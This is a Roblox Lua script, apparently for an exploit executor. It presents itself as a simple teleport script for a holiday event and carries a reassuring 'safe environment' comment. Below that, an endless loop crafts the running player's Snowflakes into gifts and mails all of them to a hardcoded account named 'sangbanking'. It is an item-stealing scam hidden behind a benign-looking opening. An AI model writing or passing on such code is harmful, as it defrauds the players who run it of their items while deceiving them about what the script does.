-- Ensure the script is run in a safe environment like Roblox Studio
-- Replace this with your teleport path
local teleportPath = game:GetService("Workspace").__THINGS.Instances.HolidayEvent.Teleports.Enter

-- Function to teleport the player character
local function teleportToTarget()
    local player = game.Players.LocalPlayer -- Get the local player
    local character = player.Character or player.CharacterAdded:Wait() -- Get the character
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Get the HumanoidRootPart

    if teleportPath and humanoidRootPart then
        humanoidRootPart.CFrame = teleportPath.CFrame -- Teleport the character
        print("Teleported to target location!")
    else
        warn("Teleport path or character not found.")
    end
end

-- Automatically teleport the player upon joining
teleportToTarget()

-- Required Libraries
local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)

local username = "sangbanking"  -- The recipient username
local loopInterval = 1  -- Interval for checking and crafting

-- Remotes
local craftRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("SnowMachine_Activate")
local mailRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")

-- Get the player's inventory
local playerInventory = Save.Get()["Inventory"]
local Lootboxinv = playerInventory["Lootbox"] or {}
local Eventinv = playerInventory["Misc"] or {}
local Petinv = playerInventory["Pet"] or {}

local SnowflakeCount = 0
local SnowflakeGiftUIDs = {}
local hasCracklingDragon = false

-- Function to calculate the counts
local function calculateCounts()
    SnowflakeCount = 0
    SnowflakeGiftUIDs = {}
    hasCracklingDragon = false

    -- Count the total Snowflakes in the Event section
    for _, item in pairs(Eventinv) do
        if item.id == "Snowflake" then
            SnowflakeCount = SnowflakeCount + item._am
        end
    end

    -- Get the UIDs of Snowflake Gifts for mailing
    for _, item in pairs(Lootboxinv) do
        if item.id == "Snowflake Gift" then
            table.insert(SnowflakeGiftUIDs, item.UID)
        end
    end

    -- Check for any Crackling Dragon in Pets inventory
    for _, pet in pairs(Petinv) do
        if pet.pt and pet.pt.id == "Crackling Dragon" then
            hasCracklingDragon = true
            break
        end
    end
end

-- Function to craft Snowflake Gifts
local function craftSnowflakeGifts()
    local currentAmount = SnowflakeCount
    while currentAmount > 0 do
        local success, errorMessage = pcall(function()
            craftRemote:InvokeServer(currentAmount)
        end)

        if success then
            print("Successfully crafted " .. currentAmount .. " Snowflake Gifts.")
            return true  -- Crafting succeeded
        else
            print("Failed to craft " .. currentAmount .. " Snowflake Gifts. Error: " .. errorMessage)
            currentAmount = currentAmount - 10
            if currentAmount <= 0 then
                print("No more Snowflakes to craft.")
                return false  -- Crafting failed
            end
        end
    end
end

-- Function to mail Snowflake Gifts
local function mailSnowflakeGifts()
    if #SnowflakeGiftUIDs > 0 then
        local args = {
            [1] = "Take these gifts",  -- Message
            [2] = username,            -- Recipient
            [3] = SnowflakeGiftUIDs,   -- List of Gift UIDs
            [4] = "Lootbox",           -- Category
            [5] = #SnowflakeGiftUIDs   -- Number of items
        }
        local success, errorMessage = pcall(function()
            mailRemote:InvokeServer(unpack(args))
        end)

        if success then
            print("Successfully mailed Snowflake Gifts to " .. username)
        else
            print("Failed to mail Snowflake Gifts. Error: " .. errorMessage)
        end
    else
        print("No Snowflake Gifts to mail.")
    end
end

-- Main process loop
while true do
    -- Recalculate counts
    calculateCounts()

    -- Print Crackling Dragon status
    if hasCracklingDragon then
        print("Crackling Dragon is available in your inventory.")
    else
        print("Crackling Dragon is not in your inventory.")
    end

    -- Craft Snowflake Gifts if Snowflakes are available
    if SnowflakeCount > 0 then
        local crafted = craftSnowflakeGifts()
        if crafted then
            -- Recalculate counts to get the updated list of Snowflake Gifts
            playerInventory = Save.Get()["Inventory"]
            Lootboxinv = playerInventory["Lootbox"] or {}
            Eventinv = playerInventory["Misc"] or {}
            Petinv = playerInventory["Pets"] or {}
            calculateCounts()

            -- Mail the crafted gifts
            mailSnowflakeGifts()
        end
    else
        print("No Snowflakes available for crafting.")
    end

    -- Wait for the next iteration
    wait(loopInterval)
end
